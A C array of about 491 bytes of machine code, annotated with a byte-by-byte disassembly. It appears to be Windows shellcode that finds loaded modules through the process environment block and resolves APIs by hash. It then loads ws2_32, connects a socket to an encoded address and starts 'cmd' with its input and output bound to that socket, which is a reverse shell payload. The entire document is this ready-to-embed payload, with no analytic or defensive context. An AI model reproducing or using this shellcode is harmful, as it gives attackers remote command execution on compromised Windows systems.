
#define X84_SIZE 491

char X84[] = {
  /* 0000 */ "\x53"                         /* push ebx                        */
  /* 0001 */ "\x55"                         /* push ebp                        */
  /* 0002 */ "\x57"                         /* push edi                        */
  /* 0003 */ "\x56"                         /* push esi                        */
  /* 0004 */ "\xeb\x18"                     /* jmp 0x1e                        */
  /* 0006 */ "\x5e"                         /* pop esi                         */
  /* 0007 */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 0009 */ "\xb1\xb7"                     /* mov cl, 0xb7                    */
  /* 000B */ "\x48"                         /* dec eax                         */
  /* 000C */ "\x8d\x2c\x0e"                 /* lea ebp, [esi+ecx]              */
  /* 000F */ "\xb1\x44"                     /* mov cl, 0x44                    */
  /* 0011 */ "\xb5\x01"                     /* mov ch, 0x1                     */
  /* 0013 */ "\x48"                         /* dec eax                         */
  /* 0014 */ "\x8d\x14\x0e"                 /* lea edx, [esi+ecx]              */
  /* 0017 */ "\xff\xd2"                     /* call edx                        */
  /* 0019 */ "\x5e"                         /* pop esi                         */
  /* 001A */ "\x5f"                         /* pop edi                         */
  /* 001B */ "\x5d"                         /* pop ebp                         */
  /* 001C */ "\x5b"                         /* pop ebx                         */
  /* 001D */ "\xc3"                         /* ret                             */
  /* 001E */ "\xe8\xe3\xff\xff\xff"         /* call 0x6                        */
  /* 0023 */ "\x77\x73"                     /* ja 0x98                         */
  /* 0025 */ "\x32\x5f\x33"                 /* xor bl, [edi+0x33]              */
  /* 0028 */ "\x32\xff"                     /* xor bh, bh                      */
  /* 002A */ "\xff\x01"                     /* inc dword [ecx]                 */
  /* 002C */ "\xf7\xdb"                     /* neg ebx                         */
  /* 002E */ "\x52"                         /* push edx                        */
  /* 002F */ "\xa4"                         /* movsb                           */
  /* 0030 */ "\x02\x99\x42\x85\xc9\x06"     /* add bl, [ecx+0x6c98542]         */
  /* 0036 */ "\x14\x2d"                     /* adc al, 0x2d                    */
  /* 0038 */ "\x19\x93\xfd\xff\xfb\x2d"     /* sbb [ebx+0x2dfbfffd], edx       */
  /* 003E */ "\x80\xff\xff"                 /* cmp bh, 0xff                    */
  /* 0041 */ "\xfe\x03"                     /* inc byte [ebx]                  */
  /* 0043 */ "\x9c"                         /* pushfd                          */
  /* 0044 */ "\x1b\x39"                     /* sbb edi, [ecx]                  */
  /* 0046 */ "\xd2\x63\x6d"                 /* shl byte [ebx+0x6d], cl         */
  /* 0049 */ "\x64\xff\x0a"                 /* dec dword [fs:edx]              */
  /* 004C */ "\xb4\x34"                     /* mov ah, 0x34                    */
  /* 004E */ "\xb1\xe4"                     /* mov cl, 0xe4                    */
  /* 0050 */ "\x02\x93\x2f\xb2\xdd\x01"     /* add dl, [ebx+0x1ddb22f]         */
  /* 0056 */ "\x0e"                         /* push cs                         */
  /* 0057 */ "\x17"                         /* pop ss                          */
  /* 0058 */ "\xe9\x3c\x51\x52\x31"         /* jmp 0x31525199                  */
  /* 005D */ "\xc0\x99\xac\x0c\x20\x30\xc2" /* rcr byte [ecx+0x30200cac], 0xc2 */
  /* 0064 */ "\x6a\x08"                     /* push 0x8                        */
  /* 0066 */ "\x59"                         /* pop ecx                         */
  /* 0067 */ "\xd1\xea"                     /* shr edx, 1                      */
  /* 0069 */ "\x73\x06"                     /* jae 0x71                        */
  /* 006B */ "\x81\xf2\x78\x3b\xf6\x82"     /* xor edx, 0x82f63b78             */
  /* 0071 */ "\xe2\xf4"                     /* loop 0x67                       */
  /* 0073 */ "\x3c\x20"                     /* cmp al, 0x20                    */
  /* 0075 */ "\x75\xe8"                     /* jnz 0x5f                        */
  /* 0077 */ "\x92"                         /* xchg edx, eax                   */
  /* 0078 */ "\x5a"                         /* pop edx                         */
  /* 0079 */ "\x59"                         /* pop ecx                         */
  /* 007A */ "\xc3"                         /* ret                             */
  /* 007B */ "\x57"                         /* push edi                        */
  /* 007C */ "\x53"                         /* push ebx                        */
  /* 007D */ "\x52"                         /* push edx                        */
  /* 007E */ "\x56"                         /* push esi                        */
  /* 007F */ "\x03\x55\x3c"                 /* add edx, [ebp+0x3c]             */
  /* 0082 */ "\x8b\x4c\x15\x28"             /* mov ecx, [ebp+edx+0x28]         */
  /* 0086 */ "\xe3\x4d"                     /* jecxz 0xd5                      */
  /* 0088 */ "\x56"                         /* push esi                        */
  /* 0089 */ "\x8b\x74\x0d\x0c"             /* mov esi, [ebp+ecx+0xc]          */
  /* 008D */ "\x48"                         /* dec eax                         */
  /* 008E */ "\x01\xee"                     /* add esi, ebp                    */
  /* 0090 */ "\xe8\xc5\xff\xff\xff"         /* call 0x5a                       */
  /* 0095 */ "\x97"                         /* xchg edi, eax                   */
  /* 0096 */ "\x8b\x74\x0d\x1c"             /* mov esi, [ebp+ecx+0x1c]         */
  /* 009A */ "\x48"                         /* dec eax                         */
  /* 009B */ "\x01\xee"                     /* add esi, ebp                    */
  /* 009D */ "\x8b\x54\x0d\x20"             /* mov edx, [ebp+ecx+0x20]         */
  /* 00A1 */ "\x48"                         /* dec eax                         */
  /* 00A2 */ "\x01\xea"                     /* add edx, ebp                    */
  /* 00A4 */ "\x8b\x5c\x0d\x24"             /* mov ebx, [ebp+ecx+0x24]         */
  /* 00A8 */ "\x48"                         /* dec eax                         */
  /* 00A9 */ "\x01\xeb"                     /* add ebx, ebp                    */
  /* 00AB */ "\x8b\x4c\x0d\x18"             /* mov ecx, [ebp+ecx+0x18]         */
  /* 00AF */ "\x58"                         /* pop eax                         */
  /* 00B0 */ "\xe3\x23"                     /* jecxz 0xd5                      */
  /* 00B2 */ "\x53"                         /* push ebx                        */
  /* 00B3 */ "\x56"                         /* push esi                        */
  /* 00B4 */ "\x93"                         /* xchg ebx, eax                   */
  /* 00B5 */ "\x8b\x74\x8a\xfc"             /* mov esi, [edx+ecx*4-0x4]        */
  /* 00B9 */ "\x48"                         /* dec eax                         */
  /* 00BA */ "\x01\xee"                     /* add esi, ebp                    */
  /* 00BC */ "\xe8\x99\xff\xff\xff"         /* call 0x5a                       */
  /* 00C1 */ "\x01\xf8"                     /* add eax, edi                    */
  /* 00C3 */ "\x39\xd8"                     /* cmp eax, ebx                    */
  /* 00C5 */ "\xe0\xee"                     /* loopne 0xb5                     */
  /* 00C7 */ "\x5e"                         /* pop esi                         */
  /* 00C8 */ "\x5b"                         /* pop ebx                         */
  /* 00C9 */ "\x75\x0a"                     /* jnz 0xd5                        */
  /* 00CB */ "\x0f\xb7\x1c\x4b"             /* movzx ebx, word [ebx+ecx*2]     */
  /* 00CF */ "\x8b\x0c\x9e"                 /* mov ecx, [esi+ebx*4]            */
  /* 00D2 */ "\x48"                         /* dec eax                         */
  /* 00D3 */ "\x01\xe9"                     /* add ecx, ebp                    */
  /* 00D5 */ "\x5e"                         /* pop esi                         */
  /* 00D6 */ "\x5a"                         /* pop edx                         */
  /* 00D7 */ "\x5b"                         /* pop ebx                         */
  /* 00D8 */ "\x5f"                         /* pop edi                         */
  /* 00D9 */ "\xc3"                         /* ret                             */
  /* 00DA */ "\xac"                         /* lodsb                           */
  /* 00DB */ "\x0f\xb6\xc0"                 /* movzx eax, al                   */
  /* 00DE */ "\x50"                         /* push eax                        */
  /* 00DF */ "\xad"                         /* lodsd                           */
  /* 00E0 */ "\x53"                         /* push ebx                        */
  /* 00E1 */ "\x57"                         /* push edi                        */
  /* 00E2 */ "\x56"                         /* push esi                        */
  /* 00E3 */ "\x55"                         /* push ebp                        */
  /* 00E4 */ "\x96"                         /* xchg esi, eax                   */
  /* 00E5 */ "\x31\xdb"                     /* xor ebx, ebx                    */
  /* 00E7 */ "\xf7\xe3"                     /* mul ebx                         */
  /* 00E9 */ "\xb3\x30"                     /* mov bl, 0x30                    */
  /* 00EB */ "\x48"                         /* dec eax                         */
  /* 00EC */ "\x79\x0f"                     /* jns 0xfd                        */
  /* 00EE */ "\x64\x8b\x3b"                 /* mov edi, [fs:ebx]               */
  /* 00F1 */ "\x8b\x7f\x0c"                 /* mov edi, [edi+0xc]              */
  /* 00F4 */ "\x8b\x7f\x0c"                 /* mov edi, [edi+0xc]              */
  /* 00F7 */ "\xb3\x18"                     /* mov bl, 0x18                    */
  /* 00F9 */ "\xb2\x50"                     /* mov dl, 0x50                    */
  /* 00FB */ "\xeb\x1b"                     /* jmp 0x118                       */
  /* 00FD */ "\xb2\x60"                     /* mov dl, 0x60                    */
  /* 00FF */ "\x65\x48"                     /* dec eax                         */
  /* 0101 */ "\x8b\x3a"                     /* mov edi, [edx]                  */
  /* 0103 */ "\x8b\x7f\x18"                 /* mov edi, [edi+0x18]             */
  /* 0106 */ "\x8b\x7f\x10"                 /* mov edi, [edi+0x10]             */
  /* 0109 */ "\xeb\x0d"                     /* jmp 0x118                       */
  /* 010B */ "\xe8\x6b\xff\xff\xff"         /* call 0x7b                       */
  /* 0110 */ "\x48"                         /* dec eax                         */
  /* 0111 */ "\x85\xc9"                     /* test ecx, ecx                   */
  /* 0113 */ "\x75\x0e"                     /* jnz 0x123                       */
  /* 0115 */ "\x48"                         /* dec eax                         */
  /* 0116 */ "\x8b\x3f"                     /* mov edi, [edi]                  */
  /* 0118 */ "\x48"                         /* dec eax                         */
  /* 0119 */ "\x8b\x2c\x1f"                 /* mov ebp, [edi+ebx]              */
  /* 011C */ "\x48"                         /* dec eax                         */
  /* 011D */ "\x85\xed"                     /* test ebp, ebp                   */
  /* 011F */ "\x75\xea"                     /* jnz 0x10b                       */
  /* 0121 */ "\x55"                         /* push ebp                        */
  /* 0122 */ "\x59"                         /* pop ecx                         */
  /* 0123 */ "\x5d"                         /* pop ebp                         */
  /* 0124 */ "\x5e"                         /* pop esi                         */
  /* 0125 */ "\x5f"                         /* pop edi                         */
  /* 0126 */ "\x5b"                         /* pop ebx                         */
  /* 0127 */ "\x5a"                         /* pop edx                         */
  /* 0128 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 012A */ "\x48"                         /* dec eax                         */
  /* 012B */ "\x79\x02"                     /* jns 0x12f                       */
  /* 012D */ "\xff\xe1"                     /* jmp ecx                         */
  /* 012F */ "\x41"                         /* inc ecx                         */
  /* 0130 */ "\x89\xd4"                     /* mov esp, edx                    */
  /* 0132 */ "\x49"                         /* dec ecx                         */
  /* 0133 */ "\x89\xcb"                     /* mov ebx, ecx                    */
  /* 0135 */ "\x41"                         /* inc ecx                         */
  /* 0136 */ "\x5f"                         /* pop edi                         */
  /* 0137 */ "\x45"                         /* inc ebp                         */
  /* 0138 */ "\x85\xe4"                     /* test esp, esp                   */
  /* 013A */ "\x74\x1c"                     /* jz 0x158                        */
  /* 013C */ "\x41"                         /* inc ecx                         */
  /* 013D */ "\x83\xec\x01"                 /* sub esp, 0x1                    */
  /* 0140 */ "\x59"                         /* pop ecx                         */
  /* 0141 */ "\x74\x15"                     /* jz 0x158                        */
  /* 0143 */ "\x41"                         /* inc ecx                         */
  /* 0144 */ "\x83\xec\x01"                 /* sub esp, 0x1                    */
  /* 0147 */ "\x5a"                         /* pop edx                         */
  /* 0148 */ "\x74\x0e"                     /* jz 0x158                        */
  /* 014A */ "\x41"                         /* inc ecx                         */
  /* 014B */ "\x83\xec\x01"                 /* sub esp, 0x1                    */
  /* 014E */ "\x41"                         /* inc ecx                         */
  /* 014F */ "\x58"                         /* pop eax                         */
  /* 0150 */ "\x74\x06"                     /* jz 0x158                        */
  /* 0152 */ "\x41"                         /* inc ecx                         */
  /* 0153 */ "\x59"                         /* pop ecx                         */
  /* 0154 */ "\x41"                         /* inc ecx                         */
  /* 0155 */ "\x83\xec\x01"                 /* sub esp, 0x1                    */
  /* 0158 */ "\x48"                         /* dec eax                         */
  /* 0159 */ "\x83\xec\x20"                 /* sub esp, 0x20                   */
  /* 015C */ "\x41"                         /* inc ecx                         */
  /* 015D */ "\xff\xd3"                     /* call ebx                        */
  /* 015F */ "\x4a"                         /* dec edx                         */
  /* 0160 */ "\x8d\x64\xe4\x20"             /* lea esp, [esp+0x20]             */
  /* 0164 */ "\x41"                         /* inc ecx                         */
  /* 0165 */ "\x57"                         /* push edi                        */
  /* 0166 */ "\xc3"                         /* ret                             */
  /* 0167 */ "\x81\xc4\x00\xff\xff\xff"     /* add esp, 0xffffff00             */
  /* 016D */ "\x89\xe7"                     /* mov edi, esp                    */
  /* 016F */ "\xfe\x46\x06"                 /* inc byte [esi+0x6]              */
  /* 0172 */ "\x56"                         /* push esi                        */
  /* 0173 */ "\xad"                         /* lodsd                           */
  /* 0174 */ "\xad"                         /* lodsd                           */
  /* 0175 */ "\xff\xd5"                     /* call ebp                        */
  /* 0177 */ "\x57"                         /* push edi                        */
  /* 0178 */ "\x6a\x02"                     /* push 0x2                        */
  /* 017A */ "\xff\xd5"                     /* call ebp                        */
  /* 017C */ "\x50"                         /* push eax                        */
  /* 017D */ "\x50"                         /* push eax                        */
  /* 017E */ "\x50"                         /* push eax                        */
  /* 017F */ "\x50"                         /* push eax                        */
  /* 0180 */ "\x6a\x01"                     /* push 0x1                        */
  /* 0182 */ "\x6a\x02"                     /* push 0x2                        */
  /* 0184 */ "\xff\xd5"                     /* call ebp                        */
  /* 0186 */ "\x93"                         /* xchg ebx, eax                   */
  /* 0187 */ "\x6a\x10"                     /* push 0x10                       */
  /* 0189 */ "\x57"                         /* push edi                        */
  /* 018A */ "\xad"                         /* lodsd                           */
  /* 018B */ "\xf7\xd0"                     /* not eax                         */
  /* 018D */ "\xab"                         /* stosd                           */
  /* 018E */ "\xad"                         /* lodsd                           */
  /* 018F */ "\xf7\xd0"                     /* not eax                         */
  /* 0191 */ "\xab"                         /* stosd                           */
  /* 0192 */ "\x53"                         /* push ebx                        */
  /* 0193 */ "\xff\xd5"                     /* call ebp                        */
  /* 0195 */ "\x54"                         /* push esp                        */
  /* 0196 */ "\x5f"                         /* pop edi                         */
  /* 0197 */ "\x57"                         /* push edi                        */
  /* 0198 */ "\xb0\x68"                     /* mov al, 0x68                    */
  /* 019A */ "\xab"                         /* stosd                           */
  /* 019B */ "\xb0\x64"                     /* mov al, 0x64                    */
  /* 019D */ "\x91"                         /* xchg ecx, eax                   */
  /* 019E */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 01A0 */ "\xf3\xaa"                     /* rep stosb                       */
  /* 01A2 */ "\x5f"                         /* pop edi                         */
  /* 01A3 */ "\x57"                         /* push edi                        */
  /* 01A4 */ "\x48"                         /* dec eax                         */
  /* 01A5 */ "\x78\x02"                     /* js 0x1a9                        */
  /* 01A7 */ "\xb1\x18"                     /* mov cl, 0x18                    */
  /* 01A9 */ "\x48"                         /* dec eax                         */
  /* 01AA */ "\x8d\x7c\x0f\x38"             /* lea edi, [edi+ecx+0x38]         */
  /* 01AE */ "\xb1\x03"                     /* mov cl, 0x3                     */
  /* 01B0 */ "\x89\x1f"                     /* mov [edi], ebx                  */
  /* 01B2 */ "\x48"                         /* dec eax                         */
  /* 01B3 */ "\xaf"                         /* scasd                           */
  /* 01B4 */ "\xe2\xfa"                     /* loop 0x1b0                      */
  /* 01B6 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 01B8 */ "\x48"                         /* dec eax                         */
  /* 01B9 */ "\x78\x02"                     /* js 0x1bd                        */
  /* 01BB */ "\xb1\x10"                     /* mov cl, 0x10                    */
  /* 01BD */ "\x58"                         /* pop eax                         */
  /* 01BE */ "\xff\x44\x08\x2d"             /* inc dword [eax+ecx+0x2d]        */
  /* 01C2 */ "\xfe\x46\x03"                 /* inc byte [esi+0x3]              */
  /* 01C5 */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 01C7 */ "\x6a\x08"                     /* push 0x8                        */
  /* 01C9 */ "\x5a"                         /* pop edx                         */
  /* 01CA */ "\xc1\xe0\x18"                 /* shl eax, 0x18                   */
  /* 01CD */ "\x57"                         /* push edi                        */
  /* 01CE */ "\x50"                         /* push eax                        */
  /* 01CF */ "\x51"                         /* push ecx                        */
  /* 01D0 */ "\x51"                         /* push ecx                        */
  /* 01D1 */ "\x52"                         /* push edx                        */
  /* 01D2 */ "\x52"                         /* push edx                        */
  /* 01D3 */ "\x51"                         /* push ecx                        */
  /* 01D4 */ "\x51"                         /* push ecx                        */
  /* 01D5 */ "\x56"                         /* push esi                        */
  /* 01D6 */ "\xad"                         /* lodsd                           */
  /* 01D7 */ "\x51"                         /* push ecx                        */
  /* 01D8 */ "\xff\xd5"                     /* call ebp                        */
  /* 01DA */ "\x6a\xff"                     /* push 0xffffffff                 */
  /* 01DC */ "\x8b\x07"                     /* mov eax, [edi]                  */
  /* 01DE */ "\x50"                         /* push eax                        */
  /* 01DF */ "\xff\xd5"                     /* call ebp                        */
  /* 01E1 */ "\x53"                         /* push ebx                        */
  /* 01E2 */ "\xff\xd5"                     /* call ebp                        */
  /* 01E4 */ "\x81\xec\x00\xff\xff\xff"     /* sub esp, 0xffffff00             */
  /* 01EA */ "\xc3"                         /* ret                             */
};